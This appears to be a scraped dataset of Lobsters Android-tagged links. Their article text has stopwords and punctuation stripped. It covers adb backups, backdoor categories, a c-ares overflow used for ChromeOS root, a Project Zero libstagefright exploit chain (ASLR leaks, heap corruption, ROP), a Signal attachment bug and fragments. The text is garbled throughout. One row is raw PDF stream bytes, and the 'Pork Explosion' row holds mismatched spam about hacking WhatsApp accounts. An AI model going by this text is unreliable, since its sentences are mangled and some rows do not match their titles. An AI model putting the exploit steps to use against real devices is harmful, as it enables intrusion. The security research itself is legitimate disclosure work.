androidplatformtools conflict try install together muuuuuuuch better wait version adb thought used android sdk manager install platform tool version coincidence platform tool platform tool version adb back knowing installed machine missing use android sdk manager install platform tool expect make platform tool default choice environment wrong add usrlocaloptandroidsdkplatformtools system path separate step please tell expect copying file android phone adb assume need start debugging session adb mounting phone device use adb pull pull relevant file phone first however need enabling usb debugging mode phone fortunately done seems depend device android version recommend search web learn enable usb debugging mode device example searched enable usb debugging mode samsung galaxy note found http far good recap enable usb debugging mode phone unlock phone connect phone usb macbook dismiss close android file transfer useless phone allow mtp connection macbook dismiss close android file transfer take hint check adb find phone assume device phone else could pull single file first let poke around phone yay want pull directory tree sdcard phone macbook may first let pull single file success clean moving pull directory reasonable size stopped job finished felt convinced adb pull would want copied mb seemed like le minute mbminute full copy gb would take hour hope faster since know long take pull entire gb card start bigbutnothuge directory time pull operation know long expect whole backup take even though using time tool start stopwatch side case time somehow fails wait woohoo time worked alleges copying directory took minute second copying mb data arithmetic say mb gb would take second hour copy live long actually work course directory called sdcard phone fact root sd card storage phone would make sense helpful universe merciful discover tried check size sdcard reported something entirely unexpected expect something closer gb gb stuff sigh directory phone alias later found indeed alias fine fine sd card phone great android aha gb used gb must glad wasted minute copying file wrong place onto phone least test case measurement mb change due copying sd card instead phone builtin storage let try directory mb data required minute second average mb encouraging rate gb would require second approximately hour copy would nice finally think took hour minute seemed work transfer ran mb least could easily see progress gui get way need wait hour copy file larger sd card install phone know work easily next time summary use adb pull file sd card onto new storage device could new sd card mounted computer enable usb debugging mode android device install android development tool specifically adb find mount path device sd card using df adb pull mount path android sd card destination drive wait several hour sound simple actually learned wait globbing adb pull want copy subset file directory need resort lowerlevel trickery pattern matching file match photo taken camera december thanks http http githubcomsschuberthdevscriptsblobmasterandroidpullallsh help
337,Lobsters,android,Android,What is a backdoor?,https://duo.com/blog/unicorn-wrangling-101-what-is-a-backdoor,backdoor,government exactly backdoor obviously boltedon piece code whose sole purpose provide type access remote otherwise attacker backdoor supposed backdoor see well backdoor word backdoor secret password backdoor remote maintenance coding flaw introduced specifically attacker allow attacker bypass normal access method infamous equal sign backdoor attempt actually occur coding flaw introduced accidentally legitimate coder allow attacker bypass normal access method library subsystem included overall build process contains flaw allows attacker bypass normal access method normal process place every phone however due configuration change affecting option timing attacker bypass normal access method obvious way known piece good code included phone altered security weakened could happen reason conclusion,constitutes backdoor software firmware even hardware question nagged u recent project duo lab worked managed get ahold three androidbased phone sale china naturally figured look government backdoor government put perform action involved informing internet finding awesome argue spend nobel peace prize money find ton reality lot nothing see depends definition backdoor exactly backdoor actually hard question answer start breaking thing several category yes incomplete list obviously boltedon piece code whose sole purpose provide type access remote otherwise attacker traditional backdoor could come form extra program app installed allows bad guy function system usually considered realtime remote access many traditional rootkits fit category could allow special access bad guy holding device hand course obvious backdoor easier spot likely forensics could trace back identify attacker backdoor supposed backdoor see well backdoor vague enough sometimes backdoor rather obvious particularly word backdoor secret password even written backwards time vendor add backdoor remote maintenance state used development accidently left often truth people make coding design mistake rather entertaining go googling article backdoor commercial product virtually vendor disclosed backdoor product release type statement website later delete statement week whole backdoor issue make vendor look really bad surprising remove website soon think get away issue long history operating system shipping default account password since nearly beginning operating system ala type issue still appear modern system coding flaw introduced specifically attacker allow attacker bypass normal access method little obscure could involve simply adding subroutine badguy check areyoubadguy true yougetfullaccessyourtableiswaiting bad guy get whatever desired every awhile hear type thing happening example infamous equal sign backdoor attempt caught attacker compromised server containing linux kernel source added simple change contained current uid basically asking current process root instead contained current uid basically assigning calling process root level access people argued debated day guess modern term interneted nonetheless backdoor method bypass restriction gain root access forensics potentially allow someone track attacker installed bit code never seen proof possible evil backdoor code could form seemingly legit maybe questionable function added security check code prevent security issue compiler optimization actually remove security check bug like actually occur rare since security review source code alone may catch personally feel would elegant route go since source code look like bad guy intentionally introduce flaw begin make proving evil intent coder even harder also smartphone one working known code base might proper route go really hide backdoor coding flaw introduced accidentally legitimate coder allow attacker bypass normal access method arguably best backdoor flaw exists attacker know target system attacker get flaw introduced code specifically poured existing code reverse engineered compiled code located flaw granted odd science anyone else find could end getting patched effectively burning attacker backdoor however evidence say attacker put flaw trail back attacker trace library subsystem included overall build process contains flaw allows attacker bypass normal access method phone manufacturer put together codebase maybe starting fairly secure android version added additional program introduce flaw thirdparty coding dependency tends happen lot people hurry build something make work could easily combine one previous one degree well attacker take advantage introduced flaw normal process place every phone however due configuration change affecting option timing attacker bypass normal access method somewhat strange happens let say fine run questionableprogramthatbacksupcredstothecloud transmission encrypted certificate pinned however attacker made change weakens encryption algorithm one attacker know breakable capture traffic attacker know configuration weak begin camp waiting traffic code system look fine configuration adjustment weak link type backdoor could happen obvious way obvious way known piece good code included phone altered security weakened somewhat similar previous one twist let say known web browser added number security feature would normally included turned purposely adjusted could happen reason type concern get weird substitute attacker bypass normal access method statement uploads private data may actually provide intended result exfiltration critical data phone may intended end result anyway imagine phone violating privacy aggressively normal part business figure monitor backdoor barely scratched surface backdoor business really one could write book subject people wonder duo lab large bar tab end given night thinking make one brain hurt ok went bit tangent let bring back real world example chinese phone chinese smartphones running outdated software fact based older version android code welldocumented known flaw one could simply query list older android cf spend minute searching interwebs pile potential backdoor ok well quite running older version software certainly valid starting place particularly looking easy entry phone o questionable apps sketchylooking code included basic install course like phone violation privacy could leveraged bet like phone one even write stuff trust u simply turn report management say yup shit find anything anywhere close new exactly found basic hot mess questionable code unicorn saying even noncurrent version o enough toyed idea looking firmware tricky thing grand scheme backdoor violates first rule attack use easiest method achieve objective boiled issue phone allowed someone right resource get information individual phone modern tech system phone home pun intended chinese government mean get data private firm based china monitor infrastructure allows phone communicate issue discussed required either access data uploaded able intercept decrypt network traffic would reason chinese government backdoor firmware easily enough get pretty much anything least need question pursue pulling apart firmware looking unicorn process could take week month also working project time spend time looking something little fruitful day chose latter conclusion nobel peace prize fascinating new bug lot looking older code already picked clean anything interesting learn lot approach backdoor total loss special thanks darren kemp khang nguyen also worked phone project
338,Lobsters,android,Android,a single byte write opened a root execution exploit,https://daniel.haxx.se/blog/2016/10/14/a-single-byte-write-opened-a-root-execution-exploit/,single byte write opened root execution exploit,subject arescreatequery oob write care project could let user execute code chromeos javascript root user got usd care writes outside buffer arescreatequery aresmkquery moderate security impact http proxy dlmalloc dlmalloc using memory buffer mess lesson take away update chrome o exploit one byte overflow symlinks,thursday september email popped inbox subject arescreatequery oob write one maintainer care project receiving mail suspected security problem care one case email said subject came individual reported chromeos exploit google turned particular care flaw one important step sequence necessary procedure followed could let user execute code chromeos javascript root user suspect pretty much worst possible exploit chromeos done presume reporter get fair amount bug bounty reward update got usd setup explanation accomplished complicated deeply impressed figured tracked eventually exploited repeatable fashion bear come simplified explanation single byte buffer overwrite fixed value could end aiding running exploit code root main google bug problem still open since still pending mitigation perform since care issue fixed told fine talk publicly care writes outside buffer care function called arescreatequery added released may updated version older function aresmkquery detail mostly interesting google us older version care case flaw old function two function contain problem discussing today used aresmkquery function moved arescreatequery year ago new function got additional argument code mostly unchanged move bug carried bug actually already present original are project forked created care back october took long someone figure report bore exactly function stick simple fact take name string input allocate memory area outgoing packet dns protocol data return newly allocated memory area length due logic mistake function could trick function allocate short buffer passing string escaped trailing dot input string like onetwothree would cause allocated memory area one byte small last byte would written outside allocated memory area buffer overflow want single byte written outside memory area commonly due dns protocol data laid packet flaw given name fixed announced world end september care shipped actual commit fixed ok function made write single byte value outside allocated buffer turn advantage redhat security team deemed problem moderate security impact clearly think lot harm behold right amount imagination luck certainly back chromeos go first need know chromeos run internal http proxy liberal accepts software us care proxy key component attacker needed tickle really badly figuring send correctly crafted request proxy would send right string care write outside heap buffer chromeos us dlmalloc managing heap memory time program allocates memory get pointer back request memory region dlmalloc put small header memory region purpose ask n byte malloc dlmalloc use header size n return pointer n byte application asked like series cleverly crafted http request various size proxy attacker managed create hole freed memory reliably make care allocated memory end know exactly chromeos dlmalloc system work bestfit allocator big care malloc thus overwritten end byte written memory written header next memory chunk handled dlmalloc specific byte following dlmalloc header writes used flag lowest bit size allocated chunk memory writing byte clear flag set one flag clear lowest bit chunk size important flag set called previnuse used dlmalloc tell merge adjacent area free value simply instead flaw could exploited way care buffer overflowed freed dlmalloc get fooled consolidating buffer subsequent one memory since toggled bit thus larger piece assumedtobefree memory partly still use open manipulation using memory buffer mess freed memory area whose end part actually still used opened playfield fun another creative http request memory block would allocated used store new data attacker managed insert right data end data block one still used another part program mostly since proxy pretty much allowed anything get crammed request attacker managed put code execute step ran whatever wanted root well user would get tricked running particular javascript even imagine long time must taken make exploit much work sweat spent report read detailed page one best thing read long go public future hope least part description become available well lesson take away matter limited harmless flaw may appear first glance serve malicious purpose serve one little step long chain event attack system skilled people ready figure necessary step update detailed writeup flaw pretty much report refer researcher found posted google project zero blog december chrome o exploit one byte overflow symlinks
339,Lobsters,android,Android,Pork Explosion Unleashed,http://bbqand0days.com/Pork-Explosion-Unleashed/,pork explosion unleashed,wiper source method,certainly possible hack another whatsapp account article break number different method make use whatsapp successful messaging platform since launch continuing acquisition facebook cross instant messaging traditional mobile service messaging billion active user across world sending message across world clear company found winning formula credit gathering method going learn go wiper mobile cybersecurity blog source method one best part whatsapp committed continuously updating app make better easier use latest new feature include ability delete message sent within
340,Lobsters,android,Android,Spying on Android events without modifying source code,http://kamalmarhubi.com/blog/2016/10/03/android-events/,spying android event without modifying source code,hard intercepting event android even actually run base class zygote let modify bytecode asm making super easy adding plugin build transform api look like one android sample without instrumentation instrumentation diff exploring unfamiliar ecosystem fun innovation token get touch,let say want intercept event android app want modify source code simple example want add logging whenever user click button app got bit curious whether possible spent time last week figuring might work extra fun never written android app year since anything java ecosystem hard intercepting event android thing going make harder android web javascript dom let kind thing time adding script src blahjs pretty much catch anything want without modifying code java class loaded fixed tricksy thing via reflection get call custom code response method call jvm provide custom class loader even trickier thing class loaded including modifying bytecode would allow insert custom code start method android run jvm run jvm bytecode instead code translated dex another bytecode format current android version even actually run instead dex get compiled install time time native code device make modifyatloadtime approach seem somewhere daunting impossible runtime modification instrumentation going work drop back compiletime instrumentation instead could modify either jvm bytecode dex translation dex bytecode lot support jvm bytecode modification jvm bytecode easier modify go one last thing make thing difficult base sdk class completely limit example instrumenting base view class might useful thing preloaded zygote sort primordial goop process apps launch speed app launch save memory allowing apps share page let modify bytecode know want modify jvm bytecode let actually bunch library help java bytecode instrumentation went asm experiment heard need intercept one type event prove approach work post look spying click viewonclicklistener interface listener implement need check class implement interface instrument onclick view method asm present streaming view content class call method class define encounter bit class file example call visit class name stuff start new class call visitmethod method oneway streaming view class need check list interface start track whether meant work instance variable override public void visit int version int access string name string signature string supername string interface call class visitor chain cvvisit version access name signature supername interface shouldinstrumentonclick arraysaslist interface contains androidviewview onclicklistener later inspecting method check see name onclick make sure instrument way work returning modified methodvisitor visitmethod override public methodvisitor visitmethod int access string name string desc string signature string exception get method visitor class visitor chain methodvisitor mv cvvisitmethod access name desc signature exception shouldinstrumentonclick nameequals onclick add method visitor chain mv new logclickadapter mv return mv part actually add code want insert code start method visitcode methodvisitor asm call library go bytecode instruction adding code put start method nicest thing look mirroring bytecode adding override public void visitcode mvvisitcode mvvisitldcinsn spy mvvisittypeinsn new javalangstringbuilder mvvisitinsn dup mvvisitmethodinsn invokespecial javalangstringbuilder init v false mvvisitldcinsn saw click mvvisitmethodinsn invokevirtual javalangstringbuilder append ljavalangstring ljavalangstringbuilder false mvvisitvarinsn aload mvvisitmethodinsn invokevirtual javalangstringbuilder append ljavalangobject ljavalangstringbuilder false mvvisitmethodinsn invokevirtual javalangstringbuilder tostring ljavalangstring false mvvisitmethodinsn invokestatic androidutillog ljavalangstring ljavalangstring false mvvisitinsn pop asm way write bytecode corresponding java code logd spy saw click view luckily nifty utility called asmifier output asm code necessary generate class file even familiar jvm bytecode asmified version going fun write really handy making super easy adding plugin build great modify class add custom spying code aim make require little modification application possible android us gradle standard app build tool wrap whole thing gradle plugin would reduce adding couple line buildgradle file app actually turned time consuming part already knew enough jvm bytecode compilation make asm part fairly straightforward learn enough asm api needed plugin get head around gradle architecture overall android build system could decide slot instrumentation end turned android build system folk great job providing api transform class get compiled dex wellnamed transform api defined transform plugin body pretty much call registertransform android plugin handled setting gradle task input output whatever else involved look like exactly exciting perhaps unless got work one android sample without instrumentation without instrumentation instrumentation click button log line dspy detail thing clicked diff difference two buildgradle file diff git aapplicationbuildgradle bapplicationbuildgradle index aapplicationbuildgradle bapplicationbuildgradle buildscript repository flatdir dirs homekamalprojectsasmbuildlibs jcenter dependency classpath classpath comandroidtoolsbuild apply plugin comandroidapplication apply plugin trackplugin repository jcenter exploring unfamiliar ecosystem fun bunch fun one thing spying program generally fun activity especially know rarely write program respond user input tested couple android sample still saw direct feedback clicking feedback log line android studio console also rewarding go sanideaihavenoideahowtoimplement totallyworkingproofofconcept day even entire code universe really set foot write passable java never touched java build system experience android limited owned two three nexus device year make curious possible dive unfamiliar area something nontrivial short period time think degree familiarity least trying instance stumbling java syntax done stuff jvm bytecode unfamiliar area android build tooling end first tried writing rust trying something know language know turned quite frustrating hard make progress ended delaying learning rust month gave project rust along make think analog innovation token play except instead optimizing reliability optimizing balance challenge fun really curious hear people experience please get touch
341,Lobsters,android,Android,Google Pixel launch event (12 PM EST),https://www.youtube.com/watch?v=q4y0KOeXViI,google pixel launch event pm est,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature madebygoogle youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature madebygoogle youtube
342,Lobsters,android,Android,p≡p - pretty Easy privacy,https://prettyeasyprivacy.com,pretty easy privacy,,technology rely centralized infrastructure us peertopeer technology anonymous transport party use content message get encrypted metadata like subject line case email
343,Lobsters,android,Android,Ceylon 1.3.0 is now available,https://ceylon-lang.org/blog/2016/09/19/ceylon-1-3-0/,ceylon available,ceylon issue android npm wildfly swarm ceylon ide intellij change support docker docker image ceylon ide change ceylon ide intellij ceylon herd ceylon ide common ceylon ide eclipse issue ceylon ide eclipse sdk change issue migration ceylon ceylon box release language specification command line toolset language module ceylon sdk formatter compilation execution dart vm language readability omission elimination potentiallyharmful potentiallyambiguous construct disciplined use static type union intersection type declarationsite usesite variance local type inference flowsensitive typing function tuple type elegant approach module dependency module comprehension treelike structure fullyreified generic type typesafe metamodel feature list quick introduction source code github issue issue tracker acknowledgement comment powered disqus,ceylon major release ceylon language issue closed first release ceylon support android development node package manager npm wildfly swarm jvm release backwardscompatible release ceylon javascript release backwardscompatible previous release ceylon ide available two leading java development environment ceylon ide intellij designed high performance large project many java dependency currently bestperforming ide ceylon change enhancement language commandline distribution include naturally release incorporates many bugfixes minor enhancement performance improvement support docker docker image ceylon available making easy run ceylon program docker container ide change ceylon ide intellij brandnew development tool intellij idea android studio featuring incremental error reporting code completion basic refactoring many intention action sophisticated navigation searching type hierarchy file structure online documentation full integration ceylon herd much much ceylon ide intellij written mostly ceylon reuses ceylon ide common project core ceylon ide eclipse completely rewritten ceylon almost issue fixed ceylon ide eclipse code completion redesigned around nonblocking approach much responsive large project addition improvement typechecker resulted significantly lower memory usage sdk change exactly issue affecting ceylon sdk fixed migration ceylon ceylon backwardcompatible ceylon necessary recompile change dependency however upgrading version ceylon platform module recommended ceylon ceylon modern modular statically typed programming language java javascript virtual machine language feature flexible readable syntax unique uncommonly elegant static type system powerful module architecture excellent tooling including awesome ide supporting intellij idea eclipse platform ceylon enables development crossplatform module execute portably virtual machine environment alternatively ceylon module may target one platform case may interoperate native code written platform box release includes complete language specification defines syntax semantics ceylon language accessible professional developer command line toolset including compiler java javascript documentation compiler test runner war archive packager fat jar packager support executing modular program jvm nodejs powerful module architecture code organization dependency management module isolation runtime also support interoperation osgi jigsaw maven npm language module minimal crossplatform foundationlevel api available separately updated version platform module comprise ceylon sdk code formatter plugin ceylon command plugin ceylon command support compilation execution dart vm two fullfeatured integrated development environment eclipse intellij idea language ceylon highly understandable objectoriented language static typing language feature emphasis upon readability strong bias toward omission elimination potentiallyharmful potentiallyambiguous construct toward highly disciplined use static type extremely powerful uncommonly elegant type system combining subtype parametric polymorphism firstclass union intersection type declarationsite usesite variance use principal type local type inference flowsensitive typing unique treatment function tuple type enabling powerful abstraction along elegant approach null modern language firstclass construct defining module dependency module flexible syntax including comprehension support expressing treelike structure fullyreified generic type jvm javascript virtual machine unique typesafe metamodel information language feature may found feature list quick introduction source code source code ceylon specification website freely available github information ceylon open source license available issue bug suggestion may reported github issue tracker acknowledgement always deeply grateful community volunteer contributed substantial part current ceylon codebase working spare time following people contributed ceylon gavin king stéphane épardaud tako schotanus tom bentley david festal enrique zamudio bastien jansen emmanuel bernard aleš justin tomáš hradec james cobb ross tate max rydahl andersen mladen turk lucas werkmeister roland tepp diego coronel matej lazar john vasileff toby crawley julien viet loic rouchon stephane gallès ivo kasiuk corbin uselton paco soberón michael musgrove daniel rochetti henning burdack luke degruchy rohit mohan griffin dejohn casey dahlin gilles duboscq tomasz krakowiak alexander altman alexander zolotko alex szczuczko andrés g aragoneses anh nhan nguyen brice dutheil carlos augusto mar charles gould chris gregory klinger martin voelkle mr arkansas paŭlo ebermann vorlent akber choudhry renato athaydes flavio oliveri michael brackx brent douglas lukas eder markus rydh julien ponge pete muir nicolas leroux brett cannon geoffrey de smet guillaume lours gunnar morling jeff parson jesse sightler oleg kulikov raimund klein sergej koščejev chris marshall simon thum maia kozheva shelby aslak knutsen fabien meurisse sjur bakka xavier coulon ari kast dan allen deniz türkoglu f meurisse jeancharles roger johannes lehmann allentc nikolay tsankov chris horne gabriel mirea georg ragaller harald wellmann oliver gondža stephen crawley byron clark francisco reverbel jonas berlin luke hutchison nikita ostroumov santiago rodriguez sean flanigan schalk w cronjé please enable javascript view comment powered disqus
344,Lobsters,android,Android,Signal for Android Attachment Bug,https://www.whispersystems.org/blog/signal-android-attachment-bug/,signal android attachment bug,released update technical detail impact attachment integrity fix released update facebook want get involved signal hiring,recently received great bug report jeanphilippe aumasson markus vervier identified problem way image audio video attachment processed signal android code consider implication bug low risk signal user released update signal android app address problem reportedtechnical detailswhen android code retrieves audio video image attachment verifies cryptographic message authentication code ensure attachment modified way transit jeanphilippe aumasson markus vervier pointed integer used represent attachment length calculationthis mean attachment greater integer representing attachment length wrap back around starting value attacker hack signal server append data legitimate attachment transit bob alice code verified integrity attachment alice end would see data verify downloading full attachment server integer representing attachment length wrap around zero end attacker modified original data everything check fine even though appended obviously outcome wantimpact attachment integrityan attacker compromised signal server want exploit bug android app modify original content append thing attacker first problem append le data anything image attachment becomes difficult since android phone memory capacity display imagethe next problem attacker know aes key used encrypt attachment trying append data without prior knowledge channel also know attachment content even attachment content type whatever append going get decrypted recipient unique key attacker know arbitrary appended content get transformed random datahowever without knowing key attacker could append original ciphertext fragment attachment even know decrypts repeated ciphertext fragment arranged decrypt original plaintext value error block first boundary error block subsequent section ciphertext appendedit likely audio video container codecs forgiving enough play error block malformed container receiving file original audio video attachment would play unmodified followed repeated fragment additionally attacker prior knowledge original attachment plaintext channel could append section decrypt byte random data unknown attacker followed byte chosen attackerfixeswe released update android app includes fix signal io desktop affected consumer signal protocol nonattachment message confidentiality integrity affected publishing analysis make much information available possible given limited impact bug set circumstance necessary exploit consider low risk signal android usersthis first time anyone ever found bug like signal though huge thanks jeanphilippe aumasson markus vervier helping improve security stability app facebookwant get involved signal hiring
345,Lobsters,android,Android,Memory disclosure mitigations in CopperheadOS,https://copperhead.co/blog/2016/09/20/memory-disclosure-mitigations,memory disclosure mitigation copperheados,,
346,Lobsters,android,Android,Announcing the Project Zero Prize,https://googleprojectzero.blogspot.com/2016/09/announcing-project-zero-prize.html,announcing project zero prize,android issue tracker,posted natalie silvanovich exploit enthusiast despite existence vulnerability reward program google company many unique highquality security bug discovered result hacking contest hoping continue stream great bug decided start contest project zero prize goal contest find vulnerability bug chain achieves remote code execution multiple android device knowing device phone number email address successful submission eligible following prize first prize usd awarded first winning entry second prize usd awarded second winning entry third prize addition participant submit winning entry invited write short technical report entry posted project zero blog contest structure contest structured bit differently contest instead saving bug entire bug chain submitting project zero prize participant asked report bug android issue tracker used part submission participant time six month contest period first person file bug use part submission file early file often course bug end used submission considered android security reward reward program google might eligible contest ended addition unlike contest public sharing vulnerability exploit submitted paramount participant submit full description exploit work submission eventually published project zero blog every vulnerability exploit technique used winning submission made public motivation yet another hacking contest main motivation gain information bug exploit work often rumour remote android exploit fairly rare see one action hoping contest improve public body knowledge type exploit hopefully teach u component issue exist security mitigation bypassed information could help protect type bug also hoping get dangerous bug fixed impact user contest often lead type bug le commonly reported getting fixed hoping contest lead least bug fixed android finally hope contest give u another data point availability type exploit fairly limited public information subject might able glean useful data number submission course contest never truly replicate market condition within vulnerability bought sold still provides least interesting information first prize thirty second learn something submission learn something expecting get something happy hunting
347,Lobsters,android,Android,Return to libstagefright: exploiting libutils on Android,https://googleprojectzero.blogspot.com/2016/09/return-to-libstagefright-exploiting.html,return libstagefright exploiting libutils android,,posted mark brand invalidator investigating different fuzzing approach android device recently turned following rather interesting bug cve fixed recent android security bulletin deep bowel usermode android system extremely serious bug since vulnerable code path accessible many different attack vector leveraged remote code execution local privilege elevation highly privileged systemserver selinux domain big fan single bug chain bug quite straightforward since quite readily fuzzable interesting undiscovered long vulnerable code libutils conversion code used many place including android const android constructor bug two function libutilsunicodecpp need match first used compute size buffer needed hold string result converting source string performs conversion function intended used together first allocate buffer required size convert obviously important agree many byte output obviously difference behaviour function fairly easily construct input produce different behaviour see one easily try walking logic function input string seen string consisting two invalid surrogate pair requiring byte output encode however seen string starting invalid surrogate pair followed valid surrogate pair encodes byte output give quite nice exploitation primitive creating string containing valid control size allocation control size overflow limitation must multiple byte larger allocation significant limitation data overflow need valid prove slightly annoying later attack vector need identify nice attack vector use exploit issue said earlier bug found fuzzing use fuzz case well found fuzzing oemspecific code vendor relevant find core android attack surface write exploit target android device instead first nice place found following piece code parcelcpp interesting generated code every system service android device call function every parcel receives give u privilege escalation untrustedapp context binder service fancy plenty choice since many inside systemserver go anywhere else except servicemanager implement logic probably oems rolling intent purpose statement true anyway wanted remote exploit seemed likely code called place accessible remotely maybe wifi bluetooth dns anyway looked around bit obvious place usually using completely distinct libcutils implementation bit frustrating remembered course mediaserver sure enough processing tag sometimes need handle unicode conversion kind convenient since already done lot legwork understanding exploit libstagefright bug producing minimal crash poc straightforward although slightly annoying since libstagefright appear parse format found documentation file attached bug report look like ftypisom isom trak eng aaaaaaaa aaaaaaaa simple file enough get tag read processed trigger large overflow small allocation highlighted first instance bad sequence trigger overflow sequence repeated many many time mitigating mitigation previous stagefright exploit crude lazy reason writing exploit bear another person ask bug exploitable latest android version happy stop working minute something worked plausible usual standard hold anyway time better bug shortcut took previously mitigated latest android version time return stagefright thing properly time fair amount additional work public building poc exploit one reliable exploit seen privately exploit northbit detailed going go real detail heapgrooming used blog post already going long hopefully exploit code debugger teach everything need know think previous post paper stagefright exploitation probably cover everything precise specific case outline step exploit take instead first thing first need solve aslr problem technique originally considered implemented already northbit using metadata returned browser construct information leak seems simplest way another possibility would corrupt object used communication remote http server mediaserver process make http request retrieve medium file could perhaps modify header leak information follow route looked using metadata corruption technique implemented seemed somewhat impractical even predict fairly reliably safe address read another issue android enabled ubsan integeroverflow checking libstagefright build duration field several arithmetic operation performed operation overflow lose bit information abort practically use duration two field retrieved chrome width height video field fit need perfectly pointersized inline heap allocation metadata let see use get information need step heap pointer leak first step bypassing aslr partial bypass like get data control address know using video height leak address data parsed medium file need two thing line nicely allocation overflow need land directly front sharedbuffer object providing backing data store keyedvector store entry metadata one track key realisation hvcc chunk used heap groom previous exploit store pointer data control inside metadata object corrupting backing vector instead make pointer height video letting u read back inside chrome let attach debugger mediaserver see happens first part exploit leak address allocation caused hvcc chunk need use overflow move height entry row height instead pointer value handed back chrome height video read back javascript powerful primitive use multiple time final exploit first though need load file repeatedly get address safely encode using need valid address write using overflow next step step module pointer leak address heap next need leak address executable code going much fiddly previous step actually trigger vulnerability twice achieve goal look bit carefully object overflowing another possibility open instead overwriting content sharedbuffer corrupt metadata change capacity sharedbuffer extends include next allocation well track information parsed stored metadata object keyedvector backing metadata expect need resize backing storage request sharedbuffer allocate data sharedbuffer think plenty space carry know practically use leak thing aligned last column hexdump normally expect find vtable pointer investigate layout object create hope find one place useful pointer offset leak happens one object sampletable allocating sampletable corrupted sharedbuffer give u following see label thing note sampletable vtable pointer consequence u safely dispose sampletable without calling method long never decrement refcount mweakrefs pointer inherited refbase serious problem u need pointer somewhere safely decremented result refcount reuse valid pointer leaked finally see target pointer vtable pointer libmediaso quite long way allocation number entry keyedvector stored outofline need perform following step everything look like second overflow completed bit cleanup need end file adding second sample table track prevents referenced need add couple entry back metadata ensure file finish parsing correctly pointer want get returned chrome step exercise reader well two powerful primitive ability leak address block data whose content control know base address relatively large generously gadgetfull module libmediaso major stress getting rop execution mediaserver process using technique previous exploit shellcode android simply case calling mprotect even imported libmediaso provided exploit performs several recent android version nexus reliable fast testing would also possible make exploit faster directly generating exploit file javascript reducing unnecessary network roundtrips retrieving identical file exploit code attached bug tracker slightly useful quirk make roping life easier reference mprotect bnomx ontransact seems security reason final thought started working exploit build upcoming android n release anyone sitting near desk testify increased aggravation caused lot general hardening work gone n result impressive say exploiting bug impossible n full chain would significantly complex initial step get control program identical significant change instead mediaserver target process new one mediaextractor run restrictive sandbox longer execmem privilege ruling mprotect route shellcode meaning privilege elevation direct rop would required day two later fairly complicated selfmodifying rop chain make necessary c virtual call interact service new heavily sandboxed mediaextractor ready start working privilege elevation systemserver however every time tested attempt lookup systemserver service failed looking log realised misunderstood selinux policy mediaextractor allowed make binder call permitted lookup binder service privilege elevation n would instead require exploiting additional distinct vulnerability sidenote original stagefright exploit used fact chrome android provides buildid useragent unnecessary weakness make fingerprinting version browser completely trivial still feature android webview chrome browser hopefully changed soon like last time new mitigation could set place make android exploitation process harder also came research hopefully making android release soon
348,Lobsters,android,Android,Android Security: A Broad Overview & A Dive into the World of Advertising,http://comp427.blogs.rice.edu/files/2015/01/android-base-1t6hnxx.pdf,android security broad overview dive world advertising,,obj length r filter flatedecode stream g j endstream endobj obj endobj obj type page parent r resource r content r mediabox endobj obj procset pdf colorspace r r r r extgstate r xobject r endobj obj length r filter flatedecode type xobject subtype form formtype bbox resource r group transparency c r true k false stream ud
350,Lobsters,android,Android,Advocating Against Android Fragments,https://medium.com/square-corner-blog/advocating-against-android-fragments-81fd0b462c97,advocating android fragment,advocating android fragment alternative dealing painful android fragment http developersquareupcomblog tech talk parent never told fragment lolcycle god object diagram hard debug switch case null null true true cartoon view controller fast fragment transaction class backstackrecord extends int commitinternal boolean throw new illegalstateexception true else return fragment creation magic new dialogfragment public oncreatedialog fragment lesson learned responsive ui fragment v custom view fragment basic example public class headlinesfragment extends public interface onheadlineselectedlistener void onarticleselected int public void oncreate super new public void onattach super public void onlistitemclick int long true public class listfragmentactivity extends implement public void oncreate super null null return new headlinesfragment public void onarticleselected int null else new articlefragment new bundle null custom view public interface container void showitem boolean onbackpressed public class mainactivity extends private protected void oncreate super public getcontainer return public void onbackpressed boolean public class itemlistview extends public itemlistview super protected void onfinishinflate super final new mylistadapter new onitemclicklistener public void onitemclick int long public class dualpanecontainer extends implement private public dualpanecontainer super protected void onfinishinflate super public boolean onbackpressed return false public void showitem public class singlepanecontainer extends implement private public singlepanecontainer super protected void onfinishinflate super public boolean onbackpressed return true return false public void showitem private boolean listviewattached return null view presenter presenter public class mydetailview extends public mydetailview super new detailpresenter protected void onfinishinflate super new onclicklistener public void onclick public void setitem class editdiscountpresenter public void savediscount return else public void cannotsavediscountwithemptyname backstack management flow ray ryan blog post deep fragment spaghetti escape public class detailfragment extends public oncreateview return false dimitris koutsogiorgas ray ryan dagger mortar dagger mortar conclusion,advocating android fragmentsalternatives dealing painful android fragmentswritten pierreyves ricauheads moved like continue keeping latest technical content square please visit u new home http developersquareupcomblogrecently gave tech talk fr droidcon paris explained problem square android fragment others could avoid using fragmentsin decided use fragment following reason time yet support tablet knew wanted eventually fragment help build responsive uisfragments view controller hold decoupled chunk business logic testedthe fragment api provides backstack management ie mirror behavior activity stack within single activity fragment built top view view easily animated fragment would give u better control screen transitionsgoogle recommended fragment wanted make code standardsince discovered better option squarewhat parent never told fragmentsthe lolcycleon android context god object activity context extra lifecycle god lifecycle kind ironic fragment god make extremely complex lifecyclesteve pomeroy made diagram complete lifecycle pretty created steve pomeroy modified remove activity lifecycle shared cc bysa licensethe lifecycle make difficult figure callback called synchronously post order hard debugwhen bug occurs app take debugger execute code step step understand happening exactly usually work hit fragmentmanagerimpl landmine code hard follow debug make hard correctly fix bug appswitch fmstate case fragmentinitializing fmsavedfragmentstate null fmsavedviewstate fmsavedfragmentstategetsparseparcelablearray fragmentmanagerimplviewstatetag fmtarget getfragment fmsavedfragmentstate fragmentmanagerimpltargetstatetag fmtarget null fmtargetrequestcode fmsavedfragmentstategetint fragmentmanagerimpltargetrequestcodestatetag fmuservisiblehint fmsavedfragmentstategetboolean fragmentmanagerimpluservisiblehinttag true fmuservisiblehint fmdeferstart true newstate fragmentstopped newstate fragmentstopped ever found stale unattached fragment recreated rotation know talking get started nested fragment coding horror put required law link cartoonafter year indepth analysis came conclusion wtfsmin countview controller fastbecause fragment create bind configure view contain lot viewrelated code effectively mean business logic decoupled view code making hard write unit test fragmentsfragment transactionsfragment transaction allow perform set fragment operation unfortunately committing transaction async posted end main thread handler queue leave app unknown state receiving multiple click event configuration changesclass backstackrecord extends fragmenttransaction int commitinternal boolean allowstateloss mcommitted throw new illegalstateexception commit already called mcommitted true maddtobackstack mindex mmanagerallocbackstackindex else mindex mmanagerenqueueaction allowstateloss return mindex fragment creation magicfragment instance created fragment manager code seems fairly reasonable dialogfragment dialogfragment new dialogfragment override public dialog oncreatedialog bundle 